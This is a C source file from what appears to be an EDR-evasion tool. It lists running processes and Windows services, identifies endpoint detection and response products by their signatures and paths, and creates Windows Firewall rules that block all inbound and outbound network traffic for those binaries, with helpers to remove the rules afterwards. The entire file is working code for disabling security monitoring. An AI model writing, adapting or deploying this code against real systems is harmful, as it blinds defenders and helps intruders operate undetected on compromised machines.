/*

--- Firewall rules to block EDR products from the network (inboud / outbound connections).

*/
#include "PrintFunctions.h"

#include "Firewalling.h"

HRESULT FirewallBlockEDRBinaries(fwBlockingRulesList* sFWEntries) {
    HRESULT hrStatus = S_OK;

    // Create the Firewall blocking rules.
    for (fwBinaryRules* slistNewFWEntry = sFWEntries->first; slistNewFWEntry != NULL; slistNewFWEntry=slistNewFWEntry->next) {
        slistNewFWEntry->ruleInboundName = (TCHAR*) calloc(FW_RULE_NAME_MAX_LENGTH + 1, sizeof(TCHAR));
        slistNewFWEntry->ruleOutboundName = (TCHAR*) calloc(FW_RULE_NAME_MAX_LENGTH + 1, sizeof(TCHAR));
        if (!(slistNewFWEntry->ruleInboundName && slistNewFWEntry->ruleOutboundName)) {
            _tprintf_or_not(TEXT("[!] Could not allocate memory to create Firewall blocking rules for \"%s\"\n"), slistNewFWEntry->binaryPath);
            return 1;
        }

        hrStatus = CreateFirewallRuleBlockBinary(slistNewFWEntry->binaryPath, NET_FW_RULE_DIR_IN, slistNewFWEntry->ruleInboundName);
        if (FAILED(hrStatus)) {
            _tprintf_or_not(TEXT("[!] Error while creating the Firewall inbound blocking rule for \"%s\" (CreateFirewallRuleBlockBinary failed: 0x%08lx)\n"), slistNewFWEntry->binaryPath, hrStatus);
        }
        else {
            _tprintf_or_not(TEXT("[+] Successfully created Firewall inbound blocking rule \"%s\" for \"%s\"\n"), slistNewFWEntry->ruleInboundName, slistNewFWEntry->binaryPath);
        }

        hrStatus = CreateFirewallRuleBlockBinary(slistNewFWEntry->binaryPath, NET_FW_RULE_DIR_OUT, slistNewFWEntry->ruleOutboundName);
        if (FAILED(hrStatus)) {
            _tprintf_or_not(TEXT("[!] Error while creating the Firewall outbound blocking rule for \"%s\" (failed with: 0x%08lx)\n"), slistNewFWEntry->binaryPath, hrStatus);
        }
        else {
            _tprintf_or_not(TEXT("[+] Successfully created Firewall outbound blocking rule \"%s\" for \"%s\"\n"), slistNewFWEntry->ruleOutboundName, slistNewFWEntry->binaryPath);
        }
    }

    return hrStatus;
}

// Enumerates the process, retrieves their associated binary path, and configures Firewall blocking network inbound / outbound access for binaries associated with EDR products.
NTSTATUS EnumEDRProcess(fwBlockingRulesList* sFWEntries) {
    PROCESSENTRY32 pe32;
    HANDLE hProcessSnap = INVALID_HANDLE_VALUE;
    HANDLE hProcess = INVALID_HANDLE_VALUE;
    TCHAR binaryPath[MAX_PATH];
    DWORD szBinaryPath = _countof(binaryPath);

    fwBinaryRules* slistNewFWEntry = NULL;

    // Take a snapshot of all processes in the system.
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        _putts_or_not(TEXT("[!] Could not get a snapshot of the system's processes (CreateToolhelp32Snapshot)"));
        return -1;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) {
        _putts_or_not(TEXT("[!] Could not retrieve information about the first process (Process32First)"));
        goto cleanup;
    }

    do {
        if (pe32.th32ProcessID == 0) {
            continue;
        }

        hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);
        if (hProcess == NULL || hProcess == INVALID_HANDLE_VALUE) {
            _tprintf_or_not(TEXT("[*] Couldn't open handle on process (OpenProcess with PROCESS_QUERY_LIMITED_INFORMATION) %ld\n"), pe32.th32ProcessID);
            continue;
        }

        szBinaryPath = _countof(binaryPath);
        if (!QueryFullProcessImageName(hProcess, 0, binaryPath, &szBinaryPath)) {
            _tprintf_or_not(TEXT("[*] Couldn't query image information of process with PID %ld (QueryFullProcessImageName failed with 0x%x)\n"), pe32.th32ProcessID, GetLastError());
            CloseHandle(hProcess);
            continue;
        }

        if (isFileSignatureMatchingEDR(binaryPath) || isBinaryPathMatchingEDR(binaryPath)) {
            slistNewFWEntry = calloc(1, sizeof(fwBinaryRules));
            if (!slistNewFWEntry) {
                _tprintf_or_not(TEXT("[!] Couldn't alloc memory for binary path for process with PID %ld (slistNewEntry)\n"), pe32.th32ProcessID);
                goto cleanup;
            }

            slistNewFWEntry->binaryPath = _tcsdup(binaryPath);
            if (!slistNewFWEntry->binaryPath) {
                _tprintf_or_not(TEXT("[!] Couldn't alloc memory for binary path for process with PID %ld (slistNewEntry->binaryPath)\n"), pe32.th32ProcessID);
                goto cleanup;
            }
            fwList_insertSorted(sFWEntries, slistNewFWEntry);
            _tprintf_or_not(TEXT("[+] Found EDR binary in execution (process with PID %i): \"%s\"\n"), pe32.th32ProcessID, slistNewFWEntry->binaryPath);
        }

        CloseHandle(hProcess);
        hProcess = INVALID_HANDLE_VALUE;
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);

    return 0;

cleanup:
    if (hProcessSnap != INVALID_HANDLE_VALUE) {
        CloseHandle(hProcessSnap);
    }

    if (hProcess != INVALID_HANDLE_VALUE) {
        CloseHandle(hProcess);
    }

    return -1;
}

// Enumerates the Windows services, retrieves their associated binary path, and configures Firewall blocking network inbound / outbound access for binaries associated with EDR products.
NTSTATUS EnumEDRServices(fwBlockingRulesList* sFWEntries) {
    SC_HANDLE hSCManager = NULL;
    SC_HANDLE hService = NULL;
    ENUM_SERVICE_STATUS_PROCESS* lpServices = NULL;
    QUERY_SERVICE_CONFIG* lpServiceConfig = 0;
    TCHAR serviceBinaryPath[MAX_PATH];
    TCHAR serviceBinaryPathCopy[MAX_PATH];
    DWORD lpServicesCount = 0;
    DWORD dwByteCount = 0, dwBytesNeeded = 0;
    DWORD dwError = 0;
    BOOL returnValue;

    fwBinaryRules* slistNewFWEntry = NULL;

    // Open an handle on the Service Control Manager.
    hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE | SC_MANAGER_CONNECT);
    if (!hSCManager) {
        _tprintf_or_not(TEXT("[!] Error while opening handle on the SCM (OpenSCManager failed: 0x%08lx)\n"), GetLastError());
        return 1;
    }

    // Query services through the Service Control Manager, first call always fail due to insufficient buffer size.
    do {
        if (lpServices) {
            free(lpServices);
            lpServices = NULL;
        }

        dwByteCount = dwByteCount + dwBytesNeeded;
        lpServices = (ENUM_SERVICE_STATUS_PROCESS*)calloc(dwByteCount, sizeof(BYTE));
        if (!lpServices) {
            _putts_or_not(TEXT("[!] Failed to allocate memory to enumerate services"));
            goto cleanup;
        }

        returnValue = EnumServicesStatusEx(hSCManager, SC_ENUM_PROCESS_INFO, SERVICE_DRIVER | SERVICE_FILE_SYSTEM_DRIVER | SERVICE_KERNEL_DRIVER | SERVICE_WIN32 | SERVICE_WIN32_OWN_PROCESS | SERVICE_WIN32_SHARE_PROCESS, SERVICE_STATE_ALL, (LPBYTE)lpServices, dwByteCount, &dwBytesNeeded, &lpServicesCount, NULL, NULL);
        if (!returnValue) {
            dwError = GetLastError();
        }
        else {
            dwError = 0;
        }
    } while (dwError == ERROR_MORE_DATA);

    if (dwError != ERROR_SUCCESS) {
        _tprintf_or_not(TEXT("[!] Could not enumerate EDR services (EnumServicesStatusEx failed: 0x%08lx)\n"), dwError);
        goto cleanup;
    }
    if (dwByteCount * sizeof(BYTE) < lpServicesCount * sizeof(ENUM_SERVICE_STATUS_PROCESS)) {
        _putts(TEXT("[!] Could not enumerate EDR services (problem in allocation)"));
        goto cleanup;
    }

    for (DWORD dwIndex = 0; dwIndex < lpServicesCount; dwIndex++) {
        dwByteCount = 0;
        dwBytesNeeded = 0;

        hService = OpenService(hSCManager, lpServices[dwIndex].lpServiceName, SERVICE_QUERY_CONFIG);
        if (!hService) {
            _tprintf_or_not(TEXT("[!] Could not open handle on service \"%s\" (\"%s\")\n"), lpServices[dwIndex].lpServiceName, lpServices[dwIndex].lpDisplayName);
            continue;
        }

        do {
            if (lpServiceConfig) {
                free(lpServiceConfig);
                lpServiceConfig = NULL;
            }
            
            lpServiceConfig = (QUERY_SERVICE_CONFIG*)calloc(dwBytesNeeded, sizeof(BYTE));
            if (!lpServiceConfig) {
                _putts_or_not(TEXT("[!] Failed to allocate memory to retrieve service configuration"));
                goto cleanup;
            }
            dwByteCount = dwBytesNeeded;

            returnValue = QueryServiceConfig(hService, lpServiceConfig, dwByteCount, &dwBytesNeeded);
            if (!returnValue) {
                dwError = GetLastError();
            }
            else {
                dwError = 0;
            }
        } while (dwError == ERROR_INSUFFICIENT_BUFFER);

        if (dwError != 0) {
            _tprintf_or_not(TEXT("[!] Could not query information of service \"%s\" (\"%s\") (QueryServiceConfig failed: 0x%08lx)\n"), lpServices[dwIndex].lpServiceName, lpServices[dwIndex].lpDisplayName, dwError);
            continue;
        }

        // If binary path is empty, skip service.
        if (lpServiceConfig->lpBinaryPathName[0] == '\0') {
            continue;
        }
        _tcscpy_s(serviceBinaryPathCopy, _countof(serviceBinaryPathCopy), lpServiceConfig->lpBinaryPathName);
        
        // replace \SystemRoot\ with %systemroot%\ 
        TCHAR* prefix = TEXT("\\SystemRoot\\");
        SIZE_T prefix_len = _tcslen(prefix);
        if (!_tcsnicmp(serviceBinaryPathCopy, prefix, prefix_len)) {
            serviceBinaryPathCopy[0] = '%';
            SIZE_T sizeDisplacement = sizeof(TCHAR) * (_tcslen(serviceBinaryPathCopy) + 1 - (prefix_len - 1));
            memmove(&serviceBinaryPathCopy[prefix_len], &serviceBinaryPathCopy[prefix_len - 1], sizeDisplacement);
            serviceBinaryPathCopy[prefix_len - 1] = '%';
        }

        // Remove \\??\\ 
        prefix = TEXT("\\??\\");
        prefix_len = _tcslen(prefix);
        if (!_tcsnicmp(serviceBinaryPathCopy, prefix, prefix_len)) {
            SIZE_T sizeDisplacement = sizeof(TCHAR) * (_tcslen(serviceBinaryPathCopy) + 1 - (prefix_len));
            memmove(&serviceBinaryPathCopy[0], &serviceBinaryPathCopy[prefix_len], sizeDisplacement);
        }
        
        // insert %systemroot%\ before system32\ 
        prefix = TEXT("system32");
        prefix_len = _tcslen(prefix);
        if (!_tcsnicmp(serviceBinaryPathCopy, prefix, prefix_len)) {
            SIZE_T sizeDisplacement = sizeof(TCHAR) * (_tcslen(serviceBinaryPathCopy) + 1);
            const TCHAR * new_prefix = TEXT("%SystemRoot%\\");
            SIZE_T new_prefix_len = _tcslen(new_prefix);
            memmove(&serviceBinaryPathCopy[new_prefix_len], &serviceBinaryPathCopy[0], sizeDisplacement);
            memcpy(serviceBinaryPathCopy, new_prefix, new_prefix_len * sizeof(TCHAR));
        }

        // Remove double quotes (replace "xxxxx" with xxxxx).
        TCHAR * positionSpace = NULL;
        if (serviceBinaryPathCopy[0] == '"') {
            TCHAR * positionSecondQuote = _tcschr(&serviceBinaryPathCopy[1], '"');
            memmove(&serviceBinaryPathCopy[0], &serviceBinaryPathCopy[1], sizeof(TCHAR) * (positionSecondQuote - &serviceBinaryPathCopy[1]));
            positionSecondQuote[-1] = '\0';
        }
        else
            // Rermove arguments (replace driver.sys -qsdq azkeaze to driver.sys).
            if ((positionSpace = _tcschr(serviceBinaryPathCopy, ' ')) != NULL) {
                *positionSpace = '\0';
        }
        
        returnValue = ExpandEnvironmentStrings(serviceBinaryPathCopy, serviceBinaryPath, _countof(serviceBinaryPath));
        if (!returnValue) {
            _tprintf_or_not(TEXT("[!] Error while attempting to expand service binary path \"%s\" (ExpandEnvironmentStrings failed: : 0x%08lx)\n"), serviceBinaryPathCopy, GetLastError());
            goto cleanup;
        }

        // check if resulting path is a file, and if it's not missing its extension
        if (GetFileAttributes(serviceBinaryPath) == INVALID_FILE_ATTRIBUTES) {
            SIZE_T posExtension = _tcslen(serviceBinaryPath);
            _tcscpy_s(serviceBinaryPath + posExtension, _countof(serviceBinaryPath) - posExtension, TEXT(".exe"));
            if (GetFileAttributes(serviceBinaryPath) == INVALID_FILE_ATTRIBUTES) {
                _tcscpy_s(serviceBinaryPath + posExtension, _countof(serviceBinaryPath) - posExtension, TEXT(".sys"));
                if (GetFileAttributes(serviceBinaryPath) == INVALID_FILE_ATTRIBUTES) {
                    _tprintf_or_not(TEXT("[!] Did not find service binary '%s' (sanitized path: '%s')\n"), lpServiceConfig->lpBinaryPathName, serviceBinaryPath);
                    // NB : If unquoted service path -> should also print this error message
                    continue;
                }
            }
        }

        if (isFileSignatureMatchingEDR(serviceBinaryPath) || isDriverPathMatchingEDR(serviceBinaryPath)) {
            slistNewFWEntry = calloc(1, sizeof(fwBinaryRules));
            if (!slistNewFWEntry) {
                _tprintf_or_not(TEXT("[!] Couldn't alloc memory for binary path (slistNewEntry) for service \"%s\"\n"), lpServices[dwIndex].lpServiceName);
                goto cleanup;
            }

            slistNewFWEntry->binaryPath = _tcsdup(serviceBinaryPath);
            if (!slistNewFWEntry->binaryPath) {
                _tprintf_or_not(TEXT("[!] Couldn't alloc memory for binary path (slistNewEntry->binaryPath) for service \"%s\"\n"), lpServices[dwIndex].lpServiceName);
                goto cleanup;
            }

            fwList_insertSorted(sFWEntries, slistNewFWEntry);
            _tprintf_or_not(TEXT("[+] Found EDR binary executed through a service name \"%s\" | path \"%s\"\n"), lpServices[dwIndex].lpServiceName, slistNewFWEntry->binaryPath);
        }

         if (!CloseServiceHandle(hService)) {
             _tprintf_or_not(TEXT("[!] Error while closing service handle (CloseServiceHandle failed: 0x%08lx)\n"), GetLastError());
             goto cleanup;
         }

        //_tprintf_or_not(TEXT("[*] Found service: name => \"%s\" | Display name => \"%s\".\n"), lpServices[dwIndex].lpServiceName, lpServices[dwIndex].lpDisplayName);
    }
    
    if (!CloseServiceHandle(hSCManager)) {
        _tprintf_or_not(TEXT("[!] Error while closing handle on the SCM (CloseServiceHandle failed: 0x%08lx)\n"), GetLastError());
    }

    free(lpServiceConfig);
    lpServiceConfig = NULL;
    free(lpServices);
    lpServices = NULL;

    return 0;

cleanup:
    if (hService) {
        if (!CloseServiceHandle(hService)) {
            _tprintf_or_not(TEXT("[!] Error while closing service handle (CloseServiceHandle failed: 0x%08lx)\n"), GetLastError());
        }
    }

    if (hSCManager) {
        if (!CloseServiceHandle(hSCManager)) {
            _tprintf_or_not(TEXT("[!] Error while closing handle on the SCM (CloseServiceHandle failed: 0x%08lx)\n"), GetLastError());
        }
    }

    if (lpServiceConfig) {
        free(lpServiceConfig);
        lpServiceConfig = NULL;
    }

    if (lpServices) {
        free(lpServices);
        lpServices = NULL;
    }

    return -1;
}


HRESULT FirewallBlockEDR(fwBlockingRulesList* sFWEntries) {
    BOOL isElevatedProcess = FALSE;
    BOOL firewallIsOn = FALSE;
    DWORD ntStatus = 0;
	HRESULT hrStatus = S_OK;

    isElevatedProcess = IsElevatedProcess();
    if (!isElevatedProcess) {
        _putts_or_not(TEXT("[!] The current process is not elevated, will not be able to add Firewall rules"));
        return E_FAIL;
    }

	hrStatus = IsFirewallEnabled(&firewallIsOn);
	if (FAILED(hrStatus)) {
        _putts_or_not(TEXT("[!] Could not configure Firewall EDR blocking rules: an error occured while attempting to determine the FireWall status"));
		return E_FAIL;
	}

	if (!firewallIsOn) {
        _putts_or_not(TEXT("[*] The Windows Firewall is NOT active for all active profiles, skipping adding Firewall rules"));
		return E_FAIL;
	}
    _putts_or_not(TEXT("[+] The Windows Firewall is on for all active profiles!"));

    _putts_or_not(TEXT("[*] Enumerating EDR processes.."));
    ntStatus = EnumEDRProcess(sFWEntries);
    if (!NT_SUCCESS(ntStatus)) {
        _putts_or_not(TEXT("[!] An error occured while enumerating the EDR processes"));
    }
    _putts_or_not(TEXT(""));

    _putts_or_not(TEXT("[*] Enumerating EDR services.."));
    ntStatus = EnumEDRServices(sFWEntries);
    if (!NT_SUCCESS(ntStatus)) {
        _putts_or_not(TEXT("[!] An error occured while enumerating the EDR services"));
    }
    _putts_or_not(TEXT(""));

    _putts_or_not(TEXT("[*] Blocking EDR found processes / services's binaries..."));
    hrStatus = FirewallBlockEDRBinaries(sFWEntries);
    if (FAILED(hrStatus)) {
        _putts_or_not(TEXT("[!] An error occured while attempting to create Firewall blocking rules for EDR processes / services"));
    }
        
	return 0;
}

HRESULT FirewallUnblockEDR(fwBlockingRulesList* sFWEntries) {
    BOOL isElevatedProcess = FALSE;
    HRESULT hrStatusFinal = S_OK;
    HRESULT hrStatusTemp = S_OK;

    isElevatedProcess = IsElevatedProcess();
    if (!isElevatedProcess) {
        _putts_or_not(TEXT("[!] The current process is not elevated, will not be able to remove Firewall rules"));
        return E_FAIL;
    }

    for (fwBinaryRules* fwEntryToDelete = sFWEntries->first; fwEntryToDelete != NULL; fwEntryToDelete = fwEntryToDelete->next) {
        hrStatusTemp = DeleteFirewallRule(fwEntryToDelete->ruleInboundName);
        if (FAILED(hrStatusTemp)) {
            hrStatusFinal = hrStatusTemp;
        }

        hrStatusTemp = DeleteFirewallRule(fwEntryToDelete->ruleOutboundName);
        if (FAILED(hrStatusTemp)) {
            hrStatusFinal = hrStatusTemp;
        }
    }

    return hrStatusFinal;
}

void FirewallPrintManualDeletion(fwBlockingRulesList* sFWEntries) {
    _putts_or_not(TEXT("[*] The Firewall blocking rules created can be manually deleted using the following commands:"));

    for (fwBinaryRules* fwEntryToDelete = sFWEntries->first; fwEntryToDelete != NULL; fwEntryToDelete = fwEntryToDelete->next) {
        _tprintf_or_not(TEXT("netsh advfirewall firewall delete rule name=%s\n"), fwEntryToDelete->ruleInboundName);
        _tprintf_or_not(TEXT("netsh advfirewall firewall delete rule name=%s\n"), fwEntryToDelete->ruleOutboundName);
    }
}

BOOL fwList_isEmpty(fwBlockingRulesList* fwEntries) {
    return fwEntries->first == NULL;
};

BOOL fwListElt_isBefore(fwBinaryRules* a, fwBinaryRules* b) {
    return _tcscmp(a->binaryPath, b->binaryPath) < 0;
};

void fwList_insertSorted(fwBlockingRulesList* fwEntries, fwBinaryRules* newFWEntry) {
    fwBinaryRules* first = fwEntries->first;
    // if first element comes after, insert at the head
    if (fwList_isEmpty(fwEntries) || fwListElt_isBefore(newFWEntry, first)) {
        // insert newFWEntry at the head of the list
        newFWEntry->next = fwEntries->first;
        fwEntries->first = newFWEntry;
        return;
    }

    // browse list from the start until next element comes after (or is equal to) our new element
    fwBinaryRules* ptr;
    for (ptr = fwEntries->first;
        (ptr->next != NULL) && fwListElt_isBefore(ptr->next, newFWEntry);
        ptr = ptr->next);
    // if end of the list, or new entry is different to the next one (no duplicate), insert it
    if ((ptr->next == NULL) || fwListElt_isBefore(newFWEntry, ptr->next)) {
        // insert newFWEntry after ptr
        newFWEntry->next = ptr->next;
        ptr->next = newFWEntry;
    }
    else {
        // duplicate entry, do nothing
    }
}